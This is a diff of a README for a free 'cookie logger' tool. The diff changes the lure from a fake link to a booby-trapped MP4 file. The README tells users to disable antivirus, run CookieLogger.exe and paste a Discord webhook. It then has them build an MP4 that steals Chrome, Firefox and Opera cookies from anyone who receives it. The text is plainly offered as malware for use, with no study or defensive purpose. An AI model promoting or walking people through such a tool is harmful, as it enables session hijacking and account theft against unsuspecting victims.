@@ -1,4 +1,4 @@
-# This Is The Best Free Cookie Logger That Uses A Fake Link
+# This Is The Best Free Cookie Logger That Uses MP4
 
 # Before The Steps Turn Off Antivirus Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus Something Like That
 
@@ -13,10 +13,12 @@ Step 3; run the CookieLogger.exe file and wait until the gui opens
 
 Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
 
-Step 7; Click the create link and copy the link to your clipboard and send it to anybody
+Step 5; Where it says mp4 file here, click the small up arrow and go to the file where the mp4 is saved 
+
+Step 7; Click Create mp4
 
 # What It Does
-Its a simple gui i made that create a fake link and it steals anybodys chrome, firefox, opera cookies
+Its a simple gui i made that creates a mp4 logger and it steals anybodys chrome, firefox, opera cookies
 
 # credits
 
